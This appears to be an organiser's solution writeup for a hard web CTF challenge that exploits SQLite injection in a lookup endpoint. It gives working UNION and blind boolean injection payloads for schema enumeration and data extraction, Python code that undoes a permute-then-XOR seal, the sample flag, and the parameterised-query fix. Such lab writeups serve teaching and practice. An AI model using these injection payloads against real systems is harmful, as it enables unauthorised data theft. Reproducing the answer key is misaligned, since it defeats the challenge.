# Quartermaster — standalone writeup (both paths: with and without `app.py`)

> Organiser copy — contains the full solution. Matches the player handout. Example flag
> uses the `static-demo-seed`; the live flag is per-instance (secrets manifest).
> Category: Web · Difficulty: Hard · Flag `zerosecurectf{[a-z0-9_]{8,48}}`.
>
> **Key framing:** having `app.py` does **not** shortcut the challenge. The per-instance
> seed (`ZSCTF_SEED`) is injected at runtime and is **not** in the source — so the table
> name, the column names and the key material are *not* computable offline from the source.
> Steps 0–4 (inject, enumerate the live schema, read the two channels) are **identical**
> with or without the source. The source only hands you the exact inverse **code** for the
> last step; without it you reconstruct that code from the described scheme. That is the
> entire difference between the two paths.

---


## The target

- `GET /lookup?tag=<v>` → JSON `{ok, columns, rows, count}` (or `{ok:false, error}` on a DB
  error — the app leaks `sqlite3` errors, which is the handle for the column-count step).
- `GET /whoami` → `{service, fingerprint}` (public, non-secret).
- The flaw is one line: `sql = "SELECT tag, name, category, location FROM assets WHERE tag = '" + tag + "'"`
  — the tag is concatenated straight into the SQL text. `execute()` runs one statement
  (no stacked queries), so the injection is **read-only**; the route still **reflects rows**.


## Steps 0–4 — identical for both paths

**0. Arity.** `__none__' ORDER BY N -- ` for `N=1,2,…`; the DB errors once `N` exceeds the
real column count. Last good `N` = **4**. Every UNION payload must select 4 columns and end `-- `.

**1. Restricted table** (in-band UNION out of `sqlite_master`):
```
__none__' UNION SELECT name, NULL, NULL, NULL FROM sqlite_master
  WHERE type='table' AND name<>'assets' AND name NOT LIKE 'sqlite_%' -- 
```
→ the one seed-named table `cust_<8hex>`.

**2. Its columns** (`pragma_table_info`):
```
__none__' UNION SELECT name, NULL, NULL, NULL FROM pragma_table_info('cust_<8hex>') -- 
```
→ among them `ct_<8hex>` (ciphertext channel) and `km_<8hex>` (key-material channel).

**3. The right row.** The table has **two** rows — the genuine custody record (`CR-<HEX>`)
and a decoy (`CR-ARCH-<HEX>`) — and the real one is **not always `id=1`** (its position is
seed-chosen). So read both rows and let the strict validator (step 5) pick the winner.

**4. Read the two channels.** Two equivalent ways:

- **In-band** (the app reflects rows, so this works and is simplest):
  ```
  __none__' UNION SELECT ct_<8hex>, km_<8hex>, NULL, NULL FROM cust_<8hex> -- 
  ```
  `rows[*][0]` = `ct` (hex), `rows[*][1]` = `km` (hex, 64 chars).

- **Blind** (what the reference solver uses; works even if values weren't reflected) — a
  boolean+length oracle via `__none__' OR (<predicate>) -- ` (true ⇒ rows returned, `count>0`):
  ```
  length((SELECT ct_<hex> FROM cust_<hex> WHERE id=R))                   -> channel length
  unicode(substr((SELECT ct_<hex> FROM cust_<hex> WHERE id=R),k,1)) <= V -> binary-search char k
  ```
  Binary-search each character of `ct` then `km`. The value itself never appears — only the boolean.

You now hold, for the real row: `ct` (hex) and `km` = `KMASK_HEX(32) || PERM_HEX(32)`.


## Step 5 — the only place the two paths differ

The seal is **permute-then-XOR**, key split across the two channels:
`ct[i] = flag[P[i]] XOR K[i]`, where `K` is a keystream from `KMASK_HEX` and `P` a permutation
from `PERM_HEX`. To invert: `scrambled[i] = ct[i] XOR K[i] = flag[P[i]]`, then place each byte
at `P[i]`.

### Path A — WITH `app.py` (copy the inverse verbatim)

The source hands you the exact three functions. Reuse them unchanged:

```python
import hashlib
def _keystream(seed_hex, n):                      # SHA-256 counter mode
    out, c = bytearray(), 0
    while len(out) < n:
        out += hashlib.sha256(seed_hex.encode() + b":" + str(c).encode()).digest(); c += 1
    return bytes(out[:n])
def _permutation(seed_hex, n):                    # Fisher-Yates, 4 big-endian bytes per index
    idx = list(range(n)); rnd = _keystream(seed_hex, 4*n)
    for i in range(n-1, 0, -1):
        j = int.from_bytes(rnd[4*i:4*i+4], "big") % (i+1); idx[i], idx[j] = idx[j], idx[i]
    return idx
def unscramble(ct_hex, keymat):
    kmask, perm = keymat[:32], keymat[32:64]
    ct = bytes.fromhex(ct_hex); n = len(ct)
    K = _keystream(kmask, n); P = _permutation(perm, n)
    scrambled = bytes(ct[i] ^ K[i] for i in range(n))
    plain = bytearray(n)
    for i in range(n): plain[P[i]] = scrambled[i]
    return plain.decode("latin-1")
```

Exact constants the source confirms (so you know what you're reading, **not** what to hardcode —
the seed is server-side, so you still must read `ct`/`km` from the live DB):
`_derive(label,nhex) = sha256(SEED + b"|" + label).hexdigest()[:nhex]`;
`REG_TABLE="cust_"+_derive(b"registry-table",8)`, `CT_COL="ct_"+_derive(b"ciphertext-column",8)`,
`KEY_COL="km_"+_derive(b"keymaterial-column",8)`; `KMASK_HEX=_derive(b"custody-xor-mask",32)`,
`PERM_HEX=_derive(b"custody-permutation",32)`, `KEYMAT=KMASK_HEX+PERM_HEX`.

### Path B — WITHOUT `app.py` (reconstruct from the described scheme)

The redacted handout states the scheme and names the algorithms but withholds the code. You
rebuild the same three functions from the description, resolving the under-specified details by
trial against the strict validator (there are only a few sane choices and the validator tells
you instantly when you're right):

1. **`km` splits in half:** 64 hex = `KMASK_HEX(32) || PERM_HEX(32)` (the handout says so).
2. **Keystream** — "SHA-256 counter-mode over `KMASK_HEX`". The only detail to pin is the counter
   framing; `sha256(seed_hex + b":" + str(c))` for `c=0,1,…` concatenated (vs `b""`/4-byte LE/BE)
   — try the obvious ASCII `":"+str(c)` first; a wrong keystream gives garbage that fails the
   validator, so you know within one run.
3. **Permutation** — "Fisher-Yates seeded by `PERM_HEX`". Pin: 4 bytes per index, **big-endian**,
   `j = int(rnd[4i:4i+4]) % (i+1)`, loop `i=n-1…1`. A wrong endianness/stride reorders bytes →
   validator fails → adjust.
4. **Invert** exactly as Path A: `scrambled[i]=ct[i]^K[i]`, `plain[P[i]]=scrambled[i]`.

The reconstructed `unscramble` is byte-for-byte the code in Path A — the handout just makes you
derive it instead of copy it. (Verified: this reconstruction inverts the real cipher on test
flags; see the organiser check.)


## Step 6 — reject the decoys (guess-exposure 0)

Validate every candidate against `^zerosecurectf\{[a-z0-9_]{8,48}\}$`. Three traps fail it, so the
validator alone tells you when you're done:

- **Asset decoy** (`AST-0000`): flag-shaped but **UPPERCASE** body — surfaces first on `OR 1=1`.
- **Skip-the-unpermute near-flag:** un-XOR but forget to un-permute → the flag's characters in
  scrambled order (not a clean word).
- **Decoy custody row** (`CR-ARCH-…`): unscrambles to a **hyphenated** near-flag.

Only the genuine `CR-<HEX>` row, fully unscrambled, matches — e.g.
`zerosecurectf{un10n_acr0ss_the_cust0dy_b0undary}` (static-demo-seed; live is per-team).


## Reference solver & fix

- Full automated solver: `solution/solve.py` (`--url http://HOST:PORT`) — arity → `sqlite_master` →
  `pragma_table_info` → blind boolean+length extraction of both channels → offline `unscramble` →
  strict-validator filter across both rows.
- Fix: parameterise — `cur.execute("… WHERE tag = ?", (tag,))` — turning the input into pure data.
